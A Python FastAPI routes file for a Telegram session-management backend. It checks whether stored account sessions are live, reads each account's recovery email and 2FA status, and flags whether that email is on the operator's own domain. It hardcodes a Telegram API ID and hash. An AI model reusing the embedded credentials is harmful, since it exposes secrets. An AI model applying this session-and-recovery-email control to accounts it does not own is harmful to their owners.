"""
Session Management API Routes
Handles: session health check, session info, recovery email (dynamic fetch)
"""

import time
from datetime import datetime
from typing import Dict, Any
from fastapi import APIRouter, HTTPException

from backend.core_engine.logger import get_logger
from backend.core_engine.pyrogram_client import get_session_manager
from backend.models.database import get_account, update_account

logger = get_logger("SessionsAPI")
router = APIRouter(tags=["Sessions"])

API_ID = 28907635
API_HASH = "fa6c3335de68283781976ae20f813f73"


def get_pyrogram():
    return get_session_manager(API_ID, API_HASH, "sessions")


async def check_session_health(phone: str) -> Dict[str, Any]:
    """
    Check session health by attempting real connection to Telegram.
    Returns actual session status, not just database flags.
    """
    manager = get_pyrogram()
    
    try:
        me_info = await manager.get_me_info(phone)
        if me_info.get("status") == "success":
            return {
                "status": "active",
                "telegram_id": me_info.get("id"),
                "first_name": me_info.get("first_name"),
                "username": me_info.get("username")
            }
    except Exception as e:
        logger.warning(f"Session check failed for {phone}: {e}")
    
    account = await get_account(phone)
    if account and account.pyrogram_session:
        try:
            connected = await manager.connect_from_string(phone, account.pyrogram_session)
            if connected:
                me_info = await manager.get_me_info(phone)
                if me_info.get("status") == "success":
                    return {
                        "status": "active",
                        "telegram_id": me_info.get("id"),
                        "reconnected": True
                    }
        except Exception as e:
            logger.error(f"Reconnection failed for {phone}: {e}")
    
    return {"status": "inactive", "reason": "Cannot connect to Telegram"}


async def get_recovery_email_dynamic(phone: str) -> Dict[str, Any]:
    """
    Fetch current recovery email directly from Telegram account settings.
    This is called dynamically, NOT stored in database.
    """
    manager = get_pyrogram()
    
    try:
        security_info = await manager.get_security_info(phone)
        
        if security_info.get("status") != "success":
            return {"status": "error", "error": "Failed to get security info"}
        
        current_email = None
        email_status = "none"
        
        if security_info.get("login_email_pattern"):
            current_email = security_info["login_email_pattern"]
            email_status = "confirmed"
        elif security_info.get("email_unconfirmed_pattern"):
            current_email = security_info["email_unconfirmed_pattern"]
            email_status = "pending_confirmation"
        elif security_info.get("has_recovery_email"):
            email_status = "set_but_hidden"
        
        return {
            "status": "success",
            "current_recovery_email": current_email,
            "email_status": email_status,
            "has_2fa": security_info.get("has_password", False),
            "has_recovery": security_info.get("has_recovery_email", False)
        }
        
    except Exception as e:
        logger.error(f"Error fetching recovery email for {phone}: {e}")
        return {"status": "error", "error": str(e)}


@router.get("/sessions/health/{account_id}")
async def get_session_health(account_id: str):
    """Check if session is active by real connection attempt"""
    phone = account_id
    
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    health = await check_session_health(phone)
    
    await update_account(
        phone,
        pyrogram_healthy=(health["status"] == "active"),
        last_session_check=datetime.utcnow()
    )
    
    return {
        "status": "success",
        "account_id": phone,
        "session_health": health
    }


@router.get("/sessions/recovery-email/{account_id}")
async def get_recovery_email(account_id: str):
    """
    Get current recovery email directly from Telegram (dynamic fetch).
    Does NOT read from database - always fetches live data.
    """
    phone = account_id
    
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    email_info = await get_recovery_email_dynamic(phone)
    
    if email_info.get("status") != "success":
        raise HTTPException(status_code=400, detail=email_info.get("error", "Failed to fetch"))
    
    our_domain = "channelsseller.site"
    is_our_email = False
    if email_info.get("current_recovery_email"):
        is_our_email = our_domain in str(email_info["current_recovery_email"])
    
    return {
        "status": "success",
        "account_id": phone,
        "current_recovery_email": email_info.get("current_recovery_email"),
        "email_status": email_info.get("email_status"),
        "is_our_email": is_our_email,
        "target_email": account.target_email,
        "has_2fa": email_info.get("has_2fa"),
        "has_recovery": email_info.get("has_recovery")
    }


@router.get("/sessions/info/{account_id}")
async def get_session_info(account_id: str):
    """Get full session info including dynamic recovery email"""
    phone = account_id
    
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    health = await check_session_health(phone)
    email_info = await get_recovery_email_dynamic(phone)
    
    manager = get_pyrogram()
    security_info = await manager.get_security_info(phone)
    
    return {
        "status": "success",
        "account_id": phone,
        "telegram_id": account.telegram_id,
        "session_status": health["status"],
        "has_pyrogram_session": account.pyrogram_session is not None,
        "has_telethon_session": account.telethon_session is not None,
        "current_recovery_email": email_info.get("current_recovery_email"),
        "email_status": email_info.get("email_status"),
        "has_2fa": security_info.get("has_password", False),
        "other_sessions_count": security_info.get("other_sessions_count", 0),
        "target_email": account.target_email
    }
